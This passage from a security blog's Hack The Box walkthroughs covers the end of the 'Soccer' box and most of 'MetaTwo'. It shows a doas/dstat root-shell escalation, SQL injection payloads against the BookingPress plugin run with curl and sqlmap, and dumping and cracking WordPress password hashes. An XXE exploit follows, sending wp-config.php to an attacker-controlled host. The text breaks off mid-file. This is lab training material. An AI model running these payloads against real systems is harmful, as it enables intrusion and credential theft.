+/snap/core20/1695/usr/bin/gpasswd
+/snap/core20/1695/usr/bin/mount
+/snap/core20/1695/usr/bin/newgrp
+/snap/core20/1695/usr/bin/passwd
+/snap/core20/1695/usr/bin/su
+/snap/core20/1695/usr/bin/sudo
+/snap/core20/1695/usr/bin/umount
+/snap/core20/1695/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/1695/usr/lib/openssh/ssh-keysign</span></code></pre></figure>
+
+<p>Looking at the man pages for <code class="language-plaintext highlighter-rouge">doas</code> I see the application allows me to execute commands as another user and I should check <code class="language-plaintext highlighter-rouge">/usr/local/etc/doas.conf</code> for current configuration.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">DOAS(1)                                                                                                BSD General Commands Manual                                                                                               DOAS(1)
+
+NAME
+     doas — execute commands as another user
+
+SYNOPSIS
+     doas [-nSs] [-a style] [-C config] [-u user] [--] command [args]
+
+DESCRIPTION
+     The doas utility executes the given command as another user.  The command argument is mandatory unless -C, -S, or -s is specified.
+
+     The options are as follows:
+
+     -a style    Use the specified authentication style when validating the user, as allowed by /etc/login.conf.  A list of doas-specific authentication methods may be configured by adding an ‘auth-doas’ entry in login.conf(5).
+
+     -C config   Parse and check the configuration file config, then exit.  If command is supplied, doas will also perform command matching.  In the latter case either ‘permit’, ‘permit nopass’ or ‘deny’ will be printed on standard
+                 output, depending on command matching results.  No command is executed.
+
+     -n          Non interactive mode, fail if doas would prompt for password.
+
+     -S          Same as -s but simulates a full login. Please note this may result in doas applying resource limits to the user based on the target user's login class. However, environment variables applicable to the target user
+                 are still stripped, unless KEEPENV is specified.
+
+     -s          Execute the shell from SHELL or /etc/passwd.
+
+     -u user     Execute the command as user.  The default is root.  Please note: On some systems multiple usernames can resolve to one UID. For example, root and toor both resolve to UID 0 on FreeBSD. Please see the "as" syntax
+                 section of the doas.conf manual page for details on how doas handles this situation.
+
+     --          Any dashes after a combined double dash (--) will be interpreted as part of the command to be run or its parameters. Not an argument passed to doas itself.
+
+EXIT STATUS
+</span><span class="gp">     The doas utility exits 0 on success, and &gt;</span>0 <span class="k">if </span>an error occurs.  It may fail <span class="k">for </span>one of the following reasons:
+<span class="go">
+     •   The config file /usr/local/etc/doas.conf could not be parsed.
+     •   The user attempted to run a command which is not permitted.
+     •   The password was incorrect.
+     •   The specified command was not found or is not executable.
+
+SEE ALSO
+     su(1), doas.conf(5)
+
+HISTORY
+     The doas command first appeared in OpenBSD 5.8.
+
+AUTHORS
+</span><span class="gp">     Ted Unangst &lt;tedu@openbsd.org&gt;</span><span class="w">
+</span><span class="go">
+BSD                                                       </span></code></pre></figure>
+
+<p>Looking at doas.conf I see I am able to run <code class="language-plaintext highlighter-rouge">dstat</code> as root.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">player@soccer:~$</span><span class="w"> </span><span class="nb">cat</span> /usr/local/etc/doas.conf
+<span class="go">permit nopass player as root cmd /usr/bin/dstat</span></code></pre></figure>
+
+<p>Looking up dstat on <a href="https://gtfobins.github.io/gtfobins/dstat/">gtfo bins</a> I find a suitable privilege escalation.  I just need to replace sudo with the doas command.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">player@soccer:~$</span><span class="w"> </span><span class="nb">echo</span> <span class="s1">'import os; os.execv("/bin/sh", ["sh"])'</span> <span class="o">&gt;</span>/usr/local/share/dstat/dstat_xxx.py
+<span class="gp">player@soccer:~$</span><span class="w"> </span>doas /usr/bin/dstat <span class="nt">--xxx</span>
+<span class="gp">/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib;</span><span class="w"> </span>see the module<span class="s1">'s documentation for alternative uses
+</span><span class="go">  import imp
+</span><span class="gp">#</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=0(root) gid=0(root) groups=0(root)
+</span><span class="gp">#</span><span class="w"> </span><span class="nb">cd</span> /root
+<span class="gp">#</span><span class="w"> </span><span class="nb">cat </span>root.txt |wc
+<span class="go">      1       1      33</span></code></pre></figure>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>“Soccer” is an example of one of the many intriguing challenges available on Hack the Box. I intend to publish walkthroughs of future retired boxes as I continue using the platform to broaden my knowledge.</p>]]></content><author><name></name></author><category term="SQLi" /><category term="hack-the-box" /><category term="easy" /><summary type="html"><![CDATA[A walkthrough of HackTheBox's Soccer.]]></summary></entry><entry><title type="html">MetaTwo</title><link href="https://blog.anotherplacein.com/blog/2023/metatwo/" rel="alternate" type="text/html" title="MetaTwo" /><published>2023-04-28T15:09:00+00:00</published><updated>2023-04-28T15:09:00+00:00</updated><id>https://blog.anotherplacein.com/blog/2023/metatwo</id><content type="html" xml:base="https://blog.anotherplacein.com/blog/2023/metatwo/"><![CDATA[<h2 id="summary">Summary</h2>
+
+<div class="text-center">
+    <div class="img-fluid">
+        <figure>
+
+  <picture>
+    
+
+    <!-- Fallback to the original file -->
+    <img src="/assets/img/metatwo/MetaTwo.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();" />
+
+  </picture>
+
+</figure>
+
+    </div>
+</div>
+<p><a href="https://app.hackthebox.com/machines/MetaTwo" target="_blank" rel="noopener noreferrer">MetaTwo Hack The Box</a></p>
+
+<p>In MetaTwo we first find a SQLi vulnerability.  We use the SQLi vulnerability to gain credentials to a wordpress admin dashboard.  We then make use of a an XXE vulnerability to read <code class="language-plaintext highlighter-rouge">wp_config.php</code> and obtain the credentials to the FTP server.  From the FTP server we obtain the credentials of the user.  Once logged in as the user we discover a command password manager and the private key the PW manager uses for encryption.  We are able to brut force the private key’s password and use it to obtain root’s password. Remove</p>
+
+<h2 id="port-scanning">Port Scanning</h2>
+
+<p><code class="language-plaintext highlighter-rouge">nmap</code> finds three pots open, FTP (21), SSH (22), and HTTP (80).  We also see that port 80 is redirecting us to <code class="language-plaintext highlighter-rouge">metapress.htb/</code>.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">┌──(kali 🛸 box)-[~/workSpace/Boxes/MetaTwo]
+</span><span class="gp">└─$</span><span class="w"> </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> 10.10.11.186        
+<span class="go">Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-22 06:39 EDT
+Nmap scan report for 10.10.11.186
+Host is up (0.028s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp?
+| fingerprint-strings: 
+|   GenericLines: 
+|     220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
+|     Invalid command: try being more creative
+|_    Invalid command: try being more creative
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 c4b44617d2102d8fec1dc927fecd79ee (RSA)
+|   256 2aea2fcb23e8c529409cab866dcd4411 (ECDSA)
+|_  256 fd78c0b0e22016fa050debd83f12a4ab (ED25519)
+80/tcp open  http    nginx 1.18.0
+|_http-title: Did not follow redirect to http://metapress.htb/
+|_http-server-header: nginx/1.18.0
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port21-TCP:V=7.93%I=7%D=4/22%Time=6443B961%P=x86_64-pc-linux-gnu%r(Gene
+SF:ricLines,8F,"220\x20ProFTPD\x20Server\x20\(Debian\)\x20\[::ffff:10\.10\
+SF:.11\.186\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20cre
+SF:ative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creative
+</span><span class="gp">SF:\r\n");</span><span class="w">
+</span><span class="gp">Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
+<span class="go">
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 210.05 seconds</span></code></pre></figure>
+
+<p>ftp, and ssh are password protected let’s add <code class="language-plaintext highlighter-rouge">metapress.htb</code> to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> and run <code class="language-plaintext highlighter-rouge">nmap</code> again on port 80.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">┌──(kali 🛸 box)-[~/workSpace/Boxes/MetaTwo]
+</span><span class="gp">└─$</span><span class="w"> </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> 10.10.11.186 <span class="nt">-p</span> 80
+<span class="go">Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-23 13:18 EDT
+Nmap scan report for metapress.htb (10.10.11.186)
+Host is up (0.026s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    nginx 1.18.0
+|_http-generator: WordPress 5.6.2
+</span><span class="gp">|_http-title: MetaPress &amp;#</span>8211<span class="p">;</span> Official company site
+<span class="go">|_http-trane-info: Problem with XML parsing of /evox/about
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+| http-robots.txt: 1 disallowed entry 
+|_/wp-admin/
+|_http-server-header: nginx/1.18.0
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.18 seconds</span></code></pre></figure>
+
+<p>We see the website was built using WordPress version 5.6.2 and wp-admin is listed in robots.txt.</p>
+
+<h2 id="checking-out-the-website">Checking out the website</h2>
+
+<p>We see we have a wordpress website with the ability to sign up for a “launch event”</p>
+<div class="row mt-3">
+    <div class="col-sm mt-3 mt-md-0">
+        <figure>
+
+  <picture>
+    
+
+    <!-- Fallback to the original file -->
+    <img src="/assets/img/metatwo/m1.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();" />
+
+  </picture>
+
+</figure>
+
+    </div>
+    <div class="col-sm mt-3 mt-md-0">
+        <figure>
+
+  <picture>
+    
+
+    <!-- Fallback to the original file -->
+    <img src="/assets/img/metatwo/m2.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();" />
+
+  </picture>
+
+</figure>
+
+    </div>
+</div>
+<p>Looking at robots.txt we find the wp-admin page.</p>
+<div class="row mt-3">
+    <div class="col-sm mt-3 mt-md-0">
+        <figure>
+
+  <picture>
+    
+
+    <!-- Fallback to the original file -->
+    <img src="/assets/img/metatwo/m6.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();" />
+
+  </picture>
+
+</figure>
+
+    </div>
+    <div class="col-sm mt-3 mt-md-0">
+        <figure>
+
+  <picture>
+    
+
+    <!-- Fallback to the original file -->
+    <img src="/assets/img/metatwo/m7.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();" />
+
+  </picture>
+
+</figure>
+
+    </div>
+</div>
+
+<p>Navigating to events we create an event and look at the traffic through burp. Looking at the post data we see the wordpress plugin BookingPress is being used.</p>
+<div class="row mt-3">
+    <div class="col-sm mt-3 mt-md-0">
+        <figure>
+
+  <picture>
+    
+
+    <!-- Fallback to the original file -->
+    <img src="/assets/img/metatwo/m3.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();" />
+
+  </picture>
+
+</figure>
+
+    </div>
+    <div class="col-sm mt-3 mt-md-0">
+        <figure>
+
+  <picture>
+    
+
+    <!-- Fallback to the original file -->
+    <img src="/assets/img/metatwo/m4.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();" />
+
+  </picture>
+
+</figure>
+
+    </div>
+</div>
+
+<p>A quick google search reveals that various version of BookingPress are vulnerable to CVE-2022-0739 and a POC is available for this cve.</p>
+
+<p>CVE-2022-0739 - BookingPress before 1.0.11 SQL Injection</p>
+
+<p>epss score: .00494</p>
+
+<p>epss percentile: .72665</p>
+
+<p>cvss base score: 9.8</p>
+
+<p><a href="https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357" target="_blank" rel="noopener noreferrer">POC</a></p>
+
+<h2 id="exploiting-cve-2022-0739">Exploiting CVE-2022-0739</h2>
+
+<p>Following the instructions in the POC for CVE-2022-0739 we are able to verify the website is vulnerable to the SQLi.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">┌──(kali 🛸 box)-[~/workSpace/Boxes/MetaTwo]
+</span><span class="gp">└─$</span><span class="w"> </span>curl <span class="nt">-i</span> <span class="s1">'http://metapress.htb/wp-admin/admin-ajax.php'</span> <span class="se">\</span>
+<span class="go">--data 'action=bookingpress_front_get_category_services&amp;_wpnonce=6027d5fa3e&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
+HTTP/1.1 200 OK
+Server: nginx/1.18.0
+Date: Sat, 22 Apr 2023 17:54:19 GMT
+</span><span class="gp">Content-Type: text/html;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>UTF-8
+<span class="go">Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/8.0.24
+X-Robots-Tag: noindex
+X-Content-Type-Options: nosniff
+Expires: Wed, 11 Jan 1984 05:00:00 GMT
+Cache-Control: no-cache, must-revalidate, max-age=0
+X-Frame-Options: SAMEORIGIN
+Referrer-Policy: strict-origin-when-cross-origin
+
+</span><span class="gp">[{"bookingpress_service_id":"10.5.15-MariaDB-0+deb11u1","bookingpress_category_id":"Debian 11","bookingpress_service_name":"debian-linux-gnu","bookingpress_service_price":"$</span>1.00<span class="s2">","</span>bookingpress_service_duration_val<span class="s2">":"</span>2<span class="s2">","</span>bookingpress_service_duration_unit<span class="s2">":"</span>3<span class="s2">","</span>bookingpress_service_description<span class="s2">":"</span>4<span class="s2">","</span>bookingpress_service_position<span class="s2">":"</span>5<span class="s2">","</span>bookingpress_servicedate_created<span class="s2">":"</span>6<span class="s2">","</span>service_price_without_currency<span class="s2">":1,"</span>img_url<span class="s2">":"</span>http:<span class="se">\/\/</span>metapress.htb<span class="se">\/</span>wp-content<span class="se">\/</span>plugins<span class="se">\/</span>bookingpress-appointment-booking<span class="se">\/</span>images<span class="se">\/</span>placeholder-img.jpg<span class="s2">"}]  </span></code></pre></figure>
+
+<p>From the poc we see that the post variable <code class="language-plaintext highlighter-rouge">total_service</code> is vulnerable.  Let’s have <code class="language-plaintext highlighter-rouge">sqlmap</code> do the leg work of enumerating the Maria database for us.</p>
+
+<p>We pass the poc through our proxy.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">┌──(kali 🛸 box)-[~/workSpace/Boxes/MetaTwo]
+</span><span class="gp">└─$</span><span class="w">  </span>curl <span class="nt">-i</span> <span class="s1">'http://metapress.htb/wp-admin/admin-ajax.php'</span> <span class="se">\</span>
+<span class="go">--data 'action=bookingpress_front_get_category_services&amp;_wpnonce=6027d5fa3e&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -' -x localhost:8080</span></code></pre></figure>
+
+<p>We save the request to a file called <code class="language-plaintext highlighter-rouge">requests.txt</code></p>
+
+<div class="text-center">
+    <div class="img-fluid">
+        <figure>
+
+  <picture>
+    
+
+    <!-- Fallback to the original file -->
+    <img src="/assets/img/metatwo/m5.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();" />
+
+  </picture>
+
+</figure>
+
+    </div>
+</div>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">┌──(kali 🛸 box)-[~/workSpace/Boxes/MetaTwo]
+</span><span class="gp">└─$</span><span class="w">  </span>sqlmap <span class="nt">-r</span> requests.txt <span class="nt">--level</span> 4 <span class="nt">--risk</span> 3 <span class="nt">--batch</span> <span class="nt">-p</span> total_service                                                                                                                                                                    1 ⨯
+<span class="go">        ___
+       __H__
+</span><span class="gp"> ___ ___[,]_____ ___ ___  {1.7.2#</span>stable<span class="o">}</span>
+<span class="go">|_ -| . [,]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:15:59 /2023-04-22/
+
+[14:15:59] [INFO] parsing HTTP request from 'requests.txt'
+[14:15:59] [WARNING] it appears that you have provided tainted parameter values ('total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -') with most likely leftover chars/statements from manual SQL injection test(s). Please, always use only valid parameter values so sqlmap could be able to run properly
+are you really sure that you want to continue (sqlmap could have problems)? [y/N] N</span></code></pre></figure>
+
+<p><code class="language-plaintext highlighter-rouge">sqlmap</code> yells at us for already having a tainted parameter value for our vulnerable variable.  Let’s change that value to something “normal.”</p>
+
+<p>Corrected <code class="language-plaintext highlighter-rouge">requests.txt</code></p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">┌──(kali 🛸 box)-[~/workSpace/Boxes/MetaTwo]
+</span><span class="gp">└─$</span><span class="w">  </span><span class="nb">cat </span>requests.txt 
+<span class="go">POST /wp-admin/admin-ajax.php HTTP/1.1
+Host: metapress.htb
+User-Agent: curl/7.88.1
+Accept: */*
+Content-Length: 185
+Content-Type: application/x-www-form-urlencoded
+Connection: close
+
+action=bookingpress_front_get_category_services&amp;_wpnonce=6027d5fa3e&amp;category_id=33&amp;total_service=35</span></code></pre></figure>
+
+<p>Running <code class="language-plaintext highlighter-rouge">sqlmap</code> again we find a few different payloads that will work on the vulnerable parameter.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">┌──(kali 🛸 box)-[~/workSpace/Boxes/MetaTwo]
+</span><span class="gp">└─$</span><span class="w">  </span>sqlmap <span class="nt">-r</span> requests.txt <span class="nt">--level</span> 4 <span class="nt">--risk</span> 3 <span class="nt">--batch</span> <span class="nt">-p</span> total_service                                           
+<span class="go">        ___                                                                                                            
+       __H__                                                                                                           
+</span><span class="gp"> ___ ___[,]_____ ___ ___  {1.7.2#</span>stable<span class="o">}</span>                                                                               
+<span class="go">|_ -| . [)]     | .'| . |                                                                                              
+|___|_  [.]_|_|_|__,|  _|                                                                                              
+      |_|V...       |_|   https://sqlmap.org                                                                           
+                                                                                                                       
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not resp
+onsible for any misuse or damage caused by this program                                                                
+                                                                                                                       
+[*] starting @ 14:22:13 /2023-04-22/                                                                                   
+                                                                                                                       
+[14:22:13] [INFO] parsing HTTP request from 'requests.txt'
+[14:22:13] [INFO] testing connection to the target URL
+[14:22:13] [INFO] checking if the target is protected by some kind of WAF/IPS
+[14:22:13] [INFO] testing if the target URL content is stable
+[14:22:14] [INFO] target URL content is stable                                                                         
+[14:22:14] [WARNING] heuristic (basic) test shows that POST parameter 'total_service' might not be injectable
+[14:22:14] [INFO] testing for SQL injection on POST parameter 'total_service'   
+[14:22:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+
+
+abridged
+</span><span class="gp">[14:22:18] [INFO] testing 'MySQL &gt;</span><span class="o">=</span> 5.0.12 AND time-based blind <span class="o">(</span>query SLEEP<span class="o">)</span><span class="s1">'
+</span><span class="gp">[14:22:28] [INFO] POST parameter 'total_service' appears to be 'MySQL &gt;</span><span class="s1">= 5.0.12 AND time-based blind (query SLEEP)'</span> injectable 
+<span class="go">[14:22:28] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[14:22:28] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[14:22:30] [INFO] target URL appears to be UNION injectable with 9 columns
+[14:22:30] [INFO] POST parameter 'total_service' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+[14:22:30] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
+POST parameter 'total_service' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 113 HTTP(s) requests:
+---
+Parameter: total_service (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: action=bookingpress_front_get_category_services&amp;_wpnonce=6027d5fa3e&amp;category_id=33&amp;total_service=-8156) OR 5081=5081-- tPXv
+
+    Type: time-based blind
+</span><span class="gp">    Title: MySQL &gt;</span><span class="o">=</span> 5.0.12 AND time-based blind <span class="o">(</span>query SLEEP<span class="o">)</span>
+<span class="go">    Payload: action=bookingpress_front_get_category_services&amp;_wpnonce=6027d5fa3e&amp;category_id=33&amp;total_service=35) AND (SELECT 1109 FROM (SELECT(SLEEP(5)))swTx)-- ZRxp
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 9 columns
+    Payload: action=bookingpress_front_get_category_services&amp;_wpnonce=6027d5fa3e&amp;category_id=33&amp;total_service=35) UNION ALL SELECT NULL,CONCAT(0x716a6b6b71,0x4d774f774d6e4743426574644f74575a4d656257414b696771634151414866424d44465450446245,0x71717a7a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+---
+[14:22:30] [INFO] the back-end DBMS is MySQL
+web application technology: Nginx 1.18.0, PHP 8.0.24
+</span><span class="gp">back-end DBMS: MySQL &gt;</span><span class="o">=</span> 5.0.12 <span class="o">(</span>MariaDB fork<span class="o">)</span>
+<span class="go">[14:22:30] [INFO] fetched data logged to text files under '/home/kali/.sqlmap/output/metapress.htb'
+
+[*] ending @ 14:22:30 /2023-04-22/</span></code></pre></figure>
+
+<p>After searching around we find password hashes in the table wp-users in database blog</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">┌──(kali 🛸 box)-[~/workSpace/Boxes/MetaTwo]
+</span><span class="gp">└─$</span><span class="w">  </span>sqlmap <span class="nt">-r</span> requests.txt <span class="nt">--dbs</span> <span class="nt">-v</span> 0
+<span class="c">...
+</span><span class="go">web application technology: Nginx 1.18.0, PHP 8.0.24
+</span><span class="gp">back-end DBMS: MySQL &gt;</span><span class="o">=</span> 5.0.12 <span class="o">(</span>MariaDB fork<span class="o">)</span>
+<span class="go">available databases [2]:
+[*] blog
+[*] information_schema
+
+┌──(kali 🛸 box)-[~/workSpace/Boxes/MetaTwo]
+</span><span class="gp">└─$</span><span class="w">  </span>sqlmap <span class="nt">-r</span> requests.txt <span class="nt">--tables</span> <span class="nt">-D</span> blog <span class="nt">-v</span> 0
+<span class="c">...
+</span><span class="go">[27 tables]
++--------------------------------------+
+| wp_bookingpress_appointment_bookings |
+| wp_bookingpress_categories           |
+| wp_bookingpress_customers            |
+| wp_bookingpress_customers_meta       |
+| wp_bookingpress_customize_settings   |
+| wp_bookingpress_debug_payment_log    |
+| wp_bookingpress_default_daysoff      |
+| wp_bookingpress_default_workhours    |
+| wp_bookingpress_entries              |
+| wp_bookingpress_form_fields          |
+| wp_bookingpress_notifications        |
+| wp_bookingpress_payment_logs         |
+| wp_bookingpress_services             |
+| wp_bookingpress_servicesmeta         |
+| wp_bookingpress_settings             |
+| wp_commentmeta                       |
+| wp_comments                          |
+| wp_links                             |
+| wp_options                           |
+| wp_postmeta                          |
+| wp_posts                             |
+| wp_term_relationships                |
+| wp_term_taxonomy                     |
+| wp_termmeta                          |
+| wp_terms                             |
+| wp_usermeta                          |
+| wp_users                             |
++--------------------------------------+
+
+┌──(kali 🛸 box)-[~/workSpace/Boxes/MetaTwo]
+</span><span class="gp">└─$</span><span class="w">  </span>sqlmap <span class="nt">-r</span> requests.txt <span class="nt">--dump</span> <span class="nt">-T</span> wp_users <span class="nt">-D</span> blog <span class="nt">-v</span> 0
+<span class="c">...
+</span><span class="go">------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
+| ID | user_url             | user_pass                          | user_email            | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key |
++----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
+</span><span class="gp">| 1  | http://metapress.htb | $</span>P<span class="nv">$BGrGrgf2wToBS79i07Rk9sN4Fzk</span>.TV. | admin@metapress.htb   | admin      | 0           | admin        | admin         | 2022-06-23 17:58:28 | &lt;blank&gt;             |
+<span class="gp">| 2  | &lt;blank&gt;</span><span class="w">              </span>| <span class="nv">$P$B4aNM28N0E</span>.tMy/JIcnVMZbGcU16Q70 | manager@metapress.htb | manager    | 0           | manager      | manager       | 2022-06-23 18:07:55 | &lt;blank&gt;             |
+<span class="go">+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+</span></code></pre></figure>
+
+<p>We use <code class="language-plaintext highlighter-rouge">john the ripper</code> on both hashes but using the word list <code class="language-plaintext highlighter-rouge">rockyou</code> we are only able to crack the hash for the manager.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">┌──(kali 🛸 box)-[~/workSpace/Boxes/MetaTwo]
+</span><span class="gp">└─$</span><span class="w"> </span>john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt hash2.txt
+<span class="go">Using default input encoding: UTF-8
+</span><span class="gp">Loaded 1 password hash (phpass [phpass ($</span>P<span class="nv">$ </span>or <span class="nv">$H$)</span> 128/128 AVX 4x3]<span class="o">)</span>
+<span class="go">Cost 1 (iteration count) is 8192 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+partylikearockstar (?)     
+1g 0:00:00:04 DONE (2023-04-22 14:40) 0.2475g/s 27326p/s 27326c/s 27326C/s poochini..onelove7
+Use the "--show --format=phpass" options to display all of the cracked passwords reliably
+Session completed. </span></code></pre></figure>
+
+<h2 id="logging-into-wordpress-admin">Logging into WordPress Admin</h2>
+
+<p>Heading back to <code class="language-plaintext highlighter-rouge">http://metapress.htb/wp-admin</code> we are able to login with <code class="language-plaintext highlighter-rouge">manager:partylikearockstar</code>.</p>
+
+<div class="row mt-3">
+    <div class="col-sm mt-3 mt-md-0">
+        <figure>
+
+  <picture>
+    
+
+    <!-- Fallback to the original file -->
+    <img src="/assets/img/metatwo/m8.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();" />
+
+  </picture>
+
+</figure>
+
+    </div>
+    <div class="col-sm mt-3 mt-md-0">
+        <figure>
+
+  <picture>
+    
+
+    <!-- Fallback to the original file -->
+    <img src="/assets/img/metatwo/m9.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();" />
+
+  </picture>
+
+</figure>
+
+    </div>
+</div>
+
+<p>Browsing the admin console we find we have the ability to upload a media file.  A google search shows CVE-2021-29447 XXE attack impacting WordPress version 5.6 - 5.7 running php 8.  This CVE was patched in version 5.7.1.  Our enumeration has found that this website is using WordPress 5.6.2 and php 8 and therefore likely vulnerable to this cve.</p>
+
+<p>CVE-2021-29447 - Media Library XXE Vulnerability</p>
+
+<p>epss score: .00562</p>
+
+<p>epss percentile: .7436</p>
+
+<p>cvss base score: 7.1</p>
+
+<p><a href="https://exploit-notes.hdks.org/exploit/web/cms/wordpress-pentesting/" target="_blank" rel="noopener noreferrer">POC</a></p>
+
+<h2 id="exploiting-cve-2021-29447">Exploiting CVE-2021-29447</h2>
+
+<p>Using the poc above we read a few well known files.  By reading <code class="language-plaintext highlighter-rouge">/etc/passwd</code> we find the username <code class="language-plaintext highlighter-rouge">jnelson</code>.  Finally we read wp-config.php with the following configuration of the exploit.</p>
+
+<p><strong>exploit.wav</strong>, <strong>exploit.dtd</strong>, and <strong>index.php</strong></p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">┌──(kali 🛸 box)-[~/workSpace/Boxes/MetaTwo]
+</span><span class="gp">└─$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-en</span> <span class="s1">'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM '</span><span class="s2">"'"</span><span class="s1">'http://10.10.14.2:9001/exploit.dtd'</span><span class="s2">"'"</span><span class="s1">'&gt;%remote;%init;%trick;] &gt;\x00'</span><span class="o">&gt;</span> exploit.wav
+<span class="go">
+┌──(kali 🛸 box)-[~/workSpace/Boxes/MetaTwo]
+</span><span class="gp">└─$</span><span class="w"> </span><span class="nb">cat </span>exploit.dtd   
+<span class="gp">&lt;!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=../wp-config.php"&gt;</span><span class="w">
+</span><span class="gp">&lt;!ENTITY % init "&lt;!ENTITY &amp;#</span>x25<span class="p">;</span> trick SYSTEM <span class="s1">'http://10.10.14.2:9001/?p=%file;'</span><span class="o">&gt;</span><span class="s2">"&gt;
+</span><span class="go">
+┌──(kali 🛸 box)-[~/workSpace/Boxes/MetaTwo]
+</span><span class="gp">└─$</span><span class="w"> </span><span class="nb">cat </span>index.php   
+<span class="go">&lt;?php 
